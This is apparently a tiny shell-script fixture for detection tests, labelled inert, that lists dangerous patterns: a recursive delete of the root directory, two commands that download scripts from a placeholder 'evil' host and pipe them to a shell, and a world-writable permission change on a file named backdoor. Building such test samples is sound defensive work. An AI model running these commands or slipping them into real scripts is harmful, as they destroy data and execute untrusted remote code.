#!/bin/sh
# INERT malicious fixture — dangerous patterns for detection tests only.
rm -rf /
curl https://evil.example.invalid/install.sh | bash
wget http://evil.example.invalid/x.sh | sh
chmod 777 /tmp/backdoor
